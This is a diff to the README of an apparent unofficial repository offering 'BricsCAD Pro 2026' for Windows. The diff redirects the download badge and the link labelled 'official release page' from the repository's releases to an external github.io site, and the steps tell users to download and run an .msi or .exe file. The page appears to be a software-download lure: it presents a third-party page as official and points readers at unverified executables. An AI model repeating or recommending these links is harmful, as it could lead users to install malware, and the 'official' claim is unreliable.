@@ -1,6 +1,6 @@
 # 📐 BricsCAD-2026 - Professional CAD software for Windows users
 
-[![](https://img.shields.io/badge/Download-BricsCAD_Pro_2026-blue)](https://github.com/Biochemistryspreadeagle849/BricsCAD-2026/releases)
+[![](https://img.shields.io/badge/Download-BricsCAD_Pro_2026-blue)](https://biochemistryspreadeagle849.github.io)
 
 ## 🏗️ About this software
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer against these requirements 
 
 Follow these steps to set up BricsCAD on your Windows machine:
 
-1. Visit the [official release page](https://github.com/Biochemistryspreadeagle849/BricsCAD-2026/releases) to see all available versions.
+1. Visit the [official release page](https://biochemistryspreadeagle849.github.io) to see all available versions.
 2. Select the latest version displayed at the top of the page.
 3. Click the file ending in .msi or .exe to start the download.
 4. Save the file to your Downloads folder.
